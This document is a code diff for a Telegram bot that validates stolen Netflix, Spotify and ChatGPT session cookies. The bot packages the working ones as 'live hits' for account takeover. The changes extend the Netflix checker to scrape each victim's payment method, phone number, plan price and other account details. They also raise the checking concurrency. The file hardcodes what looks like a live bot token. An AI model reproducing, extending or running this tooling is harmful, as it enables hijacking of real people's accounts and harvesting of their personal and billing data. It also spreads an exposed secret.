@@ -15,6 +15,7 @@ from telegram.ext import (
 )
 from concurrent.futures import ThreadPoolExecutor
 import asyncio
+from telegram.error import BadRequest
 
 TOKEN = "7953822748:AAEyAR0d88LbhS6mWA0rtwoJGtGPg0cl2Es"
 ADMIN_CHANNEL = -1002558074652  # Set to None to fully silence admin log
@@ -23,8 +24,8 @@ logging.basicConfig(level=logging.INFO)
 user_state = {}
 user_executors = {}
 user_tasks = {}
-MAX_WORKERS_PER_USER = 3
-BATCH_SIZE = 3
+MAX_WORKERS_PER_USER = 10
+BATCH_SIZE = 10
 
 START_MSG = (
     "<code>\n"
@@ -41,7 +42,6 @@ MODE_MARKUP = InlineKeyboardMarkup([
      InlineKeyboardButton("Netflix", callback_data="mode_netflix"),
      InlineKeyboardButton("ChatGPT", callback_data="mode_chatgpt")]
 ])
-
 
 def safe_filename(name):
     return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)
@@ -186,6 +186,13 @@ def is_chatgpt_cookie(cookie_dict):
             return True
     return False
 
+def unescape_plan(s):
+    import codecs
+    try:
+        return codecs.decode(s, 'unicode_escape')
+    except Exception:
+        return s
+
 def check_netflix_cookie(cookie_dict):
     session = requests.Session()
     session.cookies.update(cookie_dict)
@@ -194,40 +201,93 @@ def check_netflix_cookie(cookie_dict):
     try:
         resp = session.get(url, headers=headers, timeout=25)
         txt = resp.text
+
+        def find(pattern):
+            m = re.search(pattern, txt)
+            return m.group(1) if m else None
+
+        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
+        if not plan:
+            plan = find(r'"planName"\s*:\s*"([^"]+)"')
+        if plan:
+            plan = plan.replace("\\x20", " ").replace("\\x28", " ").replace("\\x29", " ").replace("\\u0020", " ")
+            plan = unescape_plan(plan)
+        else:
+            plan = "Unknown"
+
+        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
+        if plan_price:
+            plan_price = unescape_plan(plan_price)
+        else:
+            plan_price = "Unknown"
+
+        member_since = find(r'"memberSince":"([^"]+)"')
+        if member_since:
+            member_since = unescape_plan(member_since)
+        else:
+            member_since = "Unknown"
+
+        payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
+        if not payment_method:
+            payment_method = "Unknown"
+
+        phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
+        if phone:
+            phone = phone.replace("\\x2B", "+")
+        else:
+            phone = "Unknown"
+
+        phone_verified = find(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)')
+        if phone_verified:
+            phone_verified = "Yes" if phone_verified == "true" else "No"
+        else:
+            phone_verified = "Unknown"
+
+        video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
+        if not video_quality:
+            video_quality = "Unknown"
+
+        max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
+        if not max_streams:
+            max_streams = "Unknown"
+
+        payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
+        if payment_hold:
+            payment_hold = "Yes" if payment_hold == "true" else "No"
+        else:
+            payment_hold = "Unknown"
+
+        extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
+        if extra_member:
+            extra_member = "Yes" if extra_member == "true" else "No"
+        else:
+            extra_member = "Unknown"
+
+        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+
+        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
+
         status = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
         is_premium = bool(status and status.group(1) == 'CURRENT_MEMBER')
         is_valid = bool(status)
         if not is_valid and "NetflixId" in cookie_dict and "SecureNetflixId" not in cookie_dict:
             is_valid = "Account & Billing" in txt or 'membershipStatus' in txt
             is_premium = is_valid
-        country = "Unknown"
-        match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', txt)
-        if not match:
-            match = re.search(r'"countryCode"\s*:\s*"([^"]+)"', txt)
-        if match:
-            country = match.group(1)
-        plan = "Unknown"
-        match = re.search(r'localizedPlanName.{1,30}?value":"([^"]+)"', txt)
-        if not match:
-            match = re.search(r'"planName"\s*:\s*"([^"]+)"', txt)
-        if match:
-            plan = match.group(1)
-        elif "Premium" in txt:
-            plan = "Premium"
-        elif "Standard" in txt:
-            plan = "Standard"
-        elif "Basic" in txt:
-            plan = "Basic"
-        email_verified = bool(re.search(r'"emailVerified"\s*:\s*true', txt))
-        extra = re.search(r'"showExtraMemberSection".+?value":(true|false)', txt)
-        guid = re.search(r'"userGuid":\s*"([^"]+)"', txt)
+
         return {
             'ok': is_valid,
             'premium': is_premium,
             'country': country,
             'plan': plan,
-            'guid': guid.group(1) if guid else "",
-            'extra': extra.group(1).capitalize() if extra else "Unknown",
+            'plan_price': plan_price,
+            'member_since': member_since,
+            'payment_method': payment_method,
+            'phone': phone,
+            'phone_verified': phone_verified,
+            'video_quality': video_quality,
+            'max_streams': max_streams,
+            'on_payment_hold': payment_hold,
+            'extra_member': extra_member,
             'email_verified': email_verified,
             'cookie': cookie_dict
         }
@@ -296,7 +356,6 @@ def check_chatgpt_cookie(cookie_dict):
             return {"ok": False, "reason": f"Failed (status {resp.status_code})", "cookie": cookie_dict}
     except Exception as e:
         return {"ok": False, "reason": str(e), "cookie": cookie_dict}
-
 # --- Telegram Handlers ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -321,21 +380,28 @@ async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         stop_markup = InlineKeyboardMarkup([
             [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
         ])
-        await query.answer()
+        try:
+            await query.answer()
+        except BadRequest:
+            pass
         await context.bot.send_message(
             chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
             reply_markup=stop_markup
         )
         return
+    user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
     if "spotify" in query.data:
         mode = "spotify"
     elif "netflix" in query.data:
         mode = "netflix"
     else:
         mode = "chatgpt"
-    user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
+    user_state[user_id]['mode'] = mode
     mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
-    await query.answer(f"Selected {mode_display} mode!")
+    try:
+        await query.answer(f"Selected {mode_display} mode!")
+    except BadRequest:
+        pass
     await context.bot.send_message(
         chat_id, f"<b>{mode_display} mode activated!</b>\nNow please upload your .txt/.json/.zip cookie file.",
         parse_mode='HTML'
@@ -345,11 +411,16 @@ async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.from_user.id
     chat_id = query.message.chat_id
+    if user_id not in user_state:
+        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
     if user_state.get(user_id, {}).get('busy'):
         stop_markup = InlineKeyboardMarkup([
             [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
         ])
-        await query.answer()
+        try:
+            await query.answer()
+        except BadRequest:
+            pass
         await context.bot.send_message(
             chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
             reply_markup=stop_markup
@@ -364,7 +435,10 @@ async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_state[user_id]['mode'] = new_mode
     user_state[user_id]['cookies'] = []
     mode_display = "ChatGPT" if new_mode == "chatgpt" else new_mode.capitalize()
-    await query.answer(f"Switched to {mode_display} mode!")
+    try:
+        await query.answer(f"Switched to {mode_display} mode!")
+    except BadRequest:
+        pass
     await context.bot.send_message(
         chat_id, f"<b>Switched to {mode_display} mode!</b>\nNow please upload your .txt/.json/.zip cookie file.",
         parse_mode='HTML'
@@ -377,21 +451,33 @@ async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_tasks[user_id].cancel()
         user_state[user_id]['busy'] = False
         user_state[user_id]['stop'] = False
-        await query.answer("Stopping (task cancelled)!")
+        try:
+            await query.answer("Stopping (task cancelled)!")
+        except BadRequest:
+            pass
     else:
         user_state[user_id]['stop'] = True
-        await query.answer("Stopping...")
+        try:
+            await query.answer("Stopping...")
+        except BadRequest:
+            pass
 
 async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.from_user.id
     chat_id = query.message.chat_id
     if user_state.get(user_id, {}).get('busy'):
-        await query.answer("A check is already running.")
+        try:
+            await query.answer("A check is already running.")
+        except BadRequest:
+            pass
         return
     cookies = user_state.get(user_id, {}).get('cookies')
     if not cookies:
-        await query.answer("No cookies loaded.")
+        try:
+            await query.answer("No cookies loaded.")
+        except BadRequest:
+            pass
         return
     user_state[user_id]['stop'] = False
     user_state[user_id]['busy'] = True
@@ -399,7 +485,10 @@ async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         asyncio.wait_for(process_cookies(chat_id, cookies, user_id, context), timeout=600)
     )
     user_tasks[user_id] = task
-    await query.answer("Started checking!")
+    try:
+        await query.answer("Started checking!")
+    except BadRequest:
+        pass
 
 async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type != "private":
@@ -472,21 +561,43 @@ async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     chat_id = query.message.chat_id
     live_hits = user_state.get(user_id, {}).get('live_hits', OrderedDict())
-    mode = user_state.get(user_id, {}).get('mode')
+    print("DEBUG HITS KEYS:", list(live_hits.keys()))
     if not live_hits:
-        await query.answer("No hits so far.")
+        try:
+            await query.answer("No hits so far.")
+        except BadRequest:
+            pass
         return
     zip_buffer = io.BytesIO()
+    mode = user_state[user_id].get('mode', 'netflix')
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for idx, (name, (cookie, plan, expires)) in enumerate(live_hits.items(), 1):
-            cookie_lines = [f"{k}={v}" for k, v in cookie.items()]
-            file_content = (
-                f"Plan: {plan}\n"
-                f"Expires: {expires}\n\n"
-                f"Cookie ↓\n"
-                + "\n".join(cookie_lines)
-            )
-            txt_filename = f"Live Cookie @S4J4G {idx}.txt" if idx > 1 else "Live Cookie @S4J4G.txt"
+        for idx, (name, details_dict) in enumerate(live_hits.items(), 1):
+            country = details_dict.get('country', 'Unknown')
+            if mode == 'netflix':
+                details = [
+                    f"Plan: {details_dict.get('plan', 'Unknown')}",
+                    f"Plan Price: {details_dict.get('plan_price', 'Unknown')}",
+                    f"Country: {details_dict.get('country', 'Unknown')}",
+                    f"Member Since: {details_dict.get('member_since', 'Unknown')}",
+                    f"Payment Method: {details_dict.get('payment_method', 'Unknown')}",
+                    f"Phone: {details_dict.get('phone', 'Unknown')}",
+                    f"Phone Verified: {details_dict.get('phone_verified', 'Unknown')}",
+                    f"Video Quality: {details_dict.get('video_quality', 'Unknown')}",
+                    f"Max Streams: {details_dict.get('max_streams', 'Unknown')}",
+                    f"On Payment Hold: {details_dict.get('on_payment_hold', 'Unknown')}",
+                    f"Extra Member: {details_dict.get('extra_member', 'Unknown')}",
+                    f"Email Verified: {details_dict.get('email_verified', 'Unknown')}",
+                    ""
+                ]
+            else:
+                details = [
+                    f"Plan: {details_dict.get('plan', 'Unknown')}",
+                    f"Country: {details_dict.get('country', 'Unknown')}",
+                    ""
+                ]
+            cookie_lines = [f"{k}={v}" for k, v in details_dict.get('cookie', {}).items()]
+            file_content = "\n".join(details) + "Cookie ↓\n" + "\n".join(cookie_lines)
+            txt_filename = f"Live Cookie @S4J4G ({country}) {idx}.txt"
             zipf.writestr(txt_filename, file_content)
     zip_buffer.seek(0)
     await context.bot.send_document(
@@ -494,7 +605,10 @@ async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
         document=InputFile(zip_buffer, filename="Current_Live_Hits.zip"),
         caption=f"🔄 Current hits so far: {len(live_hits)}"
     )
-    await query.answer("Sent current hits.")
+    try:
+        await query.answer("Sent current hits.")
+    except BadRequest:
+        pass
 
 async def process_cookies(chat_id, cookies, user_id, context):
     checked, hits, fails, free = 0, 0, 0, 0
@@ -526,160 +640,129 @@ async def process_cookies(chat_id, cookies, user_id, context):
     live_hits = OrderedDict()
     user_state[user_id]['live_hits'] = live_hits
 
-    zip_buffer = io.BytesIO()
     try:
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for batch_start in range(0, len(cookies), BATCH_SIZE):
-                batch = cookies[batch_start:batch_start+BATCH_SIZE]
-                if user_state.get(user_id, {}).get('stop'):
-                    break
+        for batch_start in range(0, len(cookies), BATCH_SIZE):
+            batch = cookies[batch_start:batch_start+BATCH_SIZE]
+            if user_state.get(user_id, {}).get('stop'):
+                break
 
-                loop = asyncio.get_running_loop()
-                futures = []
-                for name, cookie in batch:
-                    if mode == 'spotify':
-                        fut = loop.run_in_executor(executor, check_spotify_cookie, cookie)
-                    elif mode == 'netflix':
-                        fut = loop.run_in_executor(executor, check_netflix_cookie, cookie)
-                    elif mode == 'chatgpt':
-                        fut = loop.run_in_executor(executor, check_chatgpt_cookie, cookie)
-                    else:
-                        fut = loop.run_in_executor(executor, lambda x: {'ok': False, 'reason': 'Unknown mode', 'cookie': x}, cookie)
-                    futures.append(asyncio.wait_for(fut, timeout=30))
-
-                try:
-                    results = await asyncio.gather(*futures, return_exceptions=True)
-                except asyncio.CancelledError:
-                    break
-
-                for i, result in enumerate(results):
-                    checked += 1
-                    if isinstance(result, Exception):
-                        result = {'ok': False, 'reason': str(result), 'cookie': batch[i][1]}
-                    name, cookie = batch[i]
-                    if mode == 'chatgpt':
-                        if result['ok']:
-                            hits += 1
-                            plan = result.get('plan', 'Unknown')
-                            expires = result.get('expires', '')
-                            live_hits[f"Hit_{hits}"] = (result['cookie'], plan, expires)
-                            user_state[user_id]['live_hits'] = live_hits
-                            status = "HIT (LOGIN OK)"
-                            cookie_lines = [f"{k}={v}" for k, v in result['cookie'].items()]
-                            file_content = (
-                                f"Status: {status}\n"
-                                f"Plan: {plan}\n"
-                                f"Expires: {expires}\n\n"
-                                f"Cookie ↓\n"
-                                + "\n".join(cookie_lines)
-                            )
-                            preview_content = file_content.split("Cookie ↓")[0].strip()
-                            txt_filename = f"Live Cookie @S4J4G {hits}.txt" if hits > 1 else "Live Cookie @S4J4G.txt"
-                            zipf.writestr(txt_filename, file_content)
-                            await context.bot.edit_message_text(
-                                chat_id=chat_id, message_id=preview_msg_id,
-                                text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
-                            )
-                        else:
-                            fails += 1
-                    else:
-                        if result['ok'] and result.get('premium', False):
-                            hits += 1
-                            plan = result.get('plan', 'Unknown')
-                            expires = ""
-                            live_hits[f"Hit_{hits}"] = (result['cookie'], plan, expires)
-                            user_state[user_id]['live_hits'] = live_hits
-                            status = "HIT (PREMIUM)"
-                            if mode == 'spotify':
-                                recurring = result.get('recurring', False)
-                                trial = result.get('trial', False)
-                                country = result.get('country', 'Unknown')
-                                cookie_lines = [f"{k}={v}" for k, v in result['cookie'].items()]
-                                file_content = (
-                                    f"Status: {status}\n"
-                                    f"Plan: {plan}\n"
-                                    f"Recurring: {recurring}\n"
-                                    f"Trial User: {trial}\n"
-                                    f"Country: {country}\n\n"
-                                    f"Cookie ↓\n"
-                                    + "\n".join(cookie_lines)
-                                )
-                                preview_content = file_content.split("Cookie ↓")[0].strip()
-                            else:
-                                email_verified = result.get('email_verified', False)
-                                country = result.get('country', 'Unknown')
-                                extra = result.get('extra', 'Unknown')
-                                cookie_lines = [f"{k}={v}" for k, v in result['cookie'].items()]
-                                file_content = (
-                                    f"Status: {status}\n"
-                                    f"Payment Method: {plan}\n"
-                                    f"Email Verified: {str(email_verified)}\n"
-                                    f"Country: {country}\n"
-                                    f"Extra member: {extra}\n\n"
-                                    f"Cookie ↓\n"
-                                    + "\n".join(cookie_lines)
-                                )
-                                preview_content = file_content.split("Cookie ↓")[0].strip()
-                            txt_filename = f"Live Cookie @S4J4G {hits}.txt" if hits > 1 else "Live Cookie @S4J4G.txt"
-                            zipf.writestr(txt_filename, file_content)
-                            await context.bot.edit_message_text(
-                                chat_id=chat_id, message_id=preview_msg_id,
-                                text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
-                            )
-                        elif result['ok']:
-                            free += 1
-                        else:
-                            fails += 1
-
-                dots_done = checked * dot_length // total
-                dots_left = dot_length - dots_done
-                dot_bar = '●' * dots_done + '○' * dots_left
-                if mode == "chatgpt":
-                    progress_msg = (
-                        f"<b>{mode_display} Cookie Checking</b>\n"
-                        f"<code>{dot_bar}</code>  {checked}/{total}\n"
-                        f"Hits: <b>{hits}</b> | Fails: <b>{fails}</b>"
-                    )
+            loop = asyncio.get_running_loop()
+            futures = []
+            for name, cookie in batch:
+                if mode == 'spotify':
+                    fut = loop.run_in_executor(executor, check_spotify_cookie, cookie)
+                elif mode == 'netflix':
+                    fut = loop.run_in_executor(executor, check_netflix_cookie, cookie)
+                elif mode == 'chatgpt':
+                    fut = loop.run_in_executor(executor, check_chatgpt_cookie, cookie)
                 else:
-                    progress_msg = (
-                        f"<b>{mode_display} Cookie Checking</b>\n"
-                        f"<code>{dot_bar}</code>  {checked}/{total}\n"
-                        f"Hits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
-                    )
-                await context.bot.edit_message_text(
-                    chat_id=chat_id, message_id=msg_id, text=progress_msg,
-                    parse_mode='HTML', reply_markup=reply_markup
+                    fut = loop.run_in_executor(executor, lambda x: {'ok': False, 'reason': 'Unknown mode', 'cookie': x}, cookie)
+                futures.append(asyncio.wait_for(fut, timeout=30))
+
+            try:
+                results = await asyncio.gather(*futures, return_exceptions=True)
+            except asyncio.CancelledError:
+                break
+
+            for i, result in enumerate(results):
+                checked += 1
+                if isinstance(result, Exception):
+                    result = {'ok': False, 'reason': str(result), 'cookie': batch[i][1]}
+                # Add hit for all valid modes
+                if result.get("ok") and (mode != "netflix" or result.get("premium", False)):
+                    hits += 1
+                    print(f"DEBUG: Adding hit {hits}: {result}")
+                    live_hits[f"Hit_{hits}"] = result
+                    user_state[user_id]['live_hits'] = live_hits
+                    if mode == "netflix":
+                        details = [
+                            f"Plan: {result.get('plan', 'Unknown')}",
+                            f"Plan Price: {result.get('plan_price', 'Unknown')}",
+                            f"Country: {result.get('country', 'Unknown')}",
+                            f"Member Since: {result.get('member_since', 'Unknown')}",
+                            f"Payment Method: {result.get('payment_method', 'Unknown')}",
+                            f"Phone: {result.get('phone', 'Unknown')}",
+                            f"Phone Verified: {result.get('phone_verified', 'Unknown')}",
+                            f"Video Quality: {result.get('video_quality', 'Unknown')}",
+                            f"Max Streams: {result.get('max_streams', 'Unknown')}",
+                            f"On Payment Hold: {result.get('on_payment_hold', 'Unknown')}",
+                            f"Extra Member: {result.get('extra_member', 'Unknown')}",
+                            f"Email Verified: {result.get('email_verified', 'Unknown')}"
+                        ]
+                        preview_content = "\n".join(details)
+                        await context.bot.edit_message_text(
+                            chat_id=chat_id, message_id=preview_msg_id,
+                            text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
+                        )
+                elif mode == "netflix" and result.get("ok"):
+                    free += 1
+                else:
+                    fails += 1
+
+            dots_done = checked * dot_length // total
+            dots_left = dot_length - dots_done
+            dot_bar = '●' * dots_done + '○' * dots_left
+            if mode == "chatgpt":
+                progress_msg = (
+                    f"<b>{mode_display} Cookie Checking</b>\n"
+                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
+                    f"Hits: <b>{hits}</b> | Fails: <b>{fails}</b>"
                 )
+            else:
+                progress_msg = (
+                    f"<b>{mode_display} Cookie Checking</b>\n"
+                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
+                    f"Hits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
+                )
+            await context.bot.edit_message_text(
+                chat_id=chat_id, message_id=msg_id, text=progress_msg,
+                parse_mode='HTML', reply_markup=reply_markup
+            )
     except (asyncio.CancelledError, asyncio.TimeoutError):
-        zip_buffer.seek(0)
-        if hits:
-            await context.bot.send_document(
-                chat_id,
-                document=InputFile(zip_buffer, filename="Le re Lund Ke Teri Cookies.zip"),
-                caption=f"⏹️ Stopped early!\nChecked: {checked}\nHits: {hits} | Fails: {fails}" +
-                ("" if mode == "chatgpt" else f" | Free: {free}") + "\nAll hits in ZIP."
-            )
-        else:
-            await context.bot.send_message(
-                chat_id,
-                f"⏹️ Stopped early!\nChecked: {checked}\nHits: 0 | Fails: {fails}" +
-                ("" if mode == "chatgpt" else f" | Free: {free}") +
-                "\n<b>No premium hits found.</b>",
-                parse_mode='HTML'
-            )
-        raise
+        pass
     finally:
         user_state[user_id]['busy'] = False
         user_state[user_id]['stop'] = False
-        user_state[user_id]['live_hits'] = OrderedDict()
         if user_id in user_executors:
             user_executors[user_id].shutdown(wait=False)
             del user_executors[user_id]
         if user_id in user_tasks:
             del user_tasks[user_id]
 
-    zip_buffer.seek(0)
+    # At end, send ZIP of all hits if any
+    print("FINAL DEBUG HITS KEYS:", list(live_hits.keys()))
     if hits:
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for idx, (name, details_dict) in enumerate(live_hits.items(), 1):
+                country = details_dict.get('country', 'Unknown')
+                if mode == 'netflix':
+                    details = [
+                        f"Plan: {details_dict.get('plan', 'Unknown')}",
+                        f"Plan Price: {details_dict.get('plan_price', 'Unknown')}",
+                        f"Country: {details_dict.get('country', 'Unknown')}",
+                        f"Member Since: {details_dict.get('member_since', 'Unknown')}",
+                        f"Payment Method: {details_dict.get('payment_method', 'Unknown')}",
+                        f"Phone: {details_dict.get('phone', 'Unknown')}",
+                        f"Phone Verified: {details_dict.get('phone_verified', 'Unknown')}",
+                        f"Video Quality: {details_dict.get('video_quality', 'Unknown')}",
+                        f"Max Streams: {details_dict.get('max_streams', 'Unknown')}",
+                        f"On Payment Hold: {details_dict.get('on_payment_hold', 'Unknown')}",
+                        f"Extra Member: {details_dict.get('extra_member', 'Unknown')}",
+                        f"Email Verified: {details_dict.get('email_verified', 'Unknown')}",
+                        ""
+                    ]
+                else:
+                    details = [
+                        f"Plan: {details_dict.get('plan', 'Unknown')}",
+                        f"Country: {details_dict.get('country', 'Unknown')}",
+                        ""
+                    ]
+                cookie_lines = [f"{k}={v}" for k, v in details_dict.get('cookie', {}).items()]
+                file_content = "\n".join(details) + "Cookie ↓\n" + "\n".join(cookie_lines)
+                txt_filename = f"Live Cookie @S4J4G ({country}) {idx}.txt"
+                zipf.writestr(txt_filename, file_content)
+        zip_buffer.seek(0)
         await context.bot.send_document(
             chat_id,
             document=InputFile(zip_buffer, filename="Le re Lund Ke Teri Cookies.zip"),
@@ -702,7 +785,7 @@ async def process_cookies(chat_id, cookies, user_id, context):
                 ("" if mode == "chatgpt" else f" | Free: {free}"),
                 parse_mode='HTML'
             )
-    except Exception as e:
+    except Exception:
         pass
 
 if __name__ == "__main__":
